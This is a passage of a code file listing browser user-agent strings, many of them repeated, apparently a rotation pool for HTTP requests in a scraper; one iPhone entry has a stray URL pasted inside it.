     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
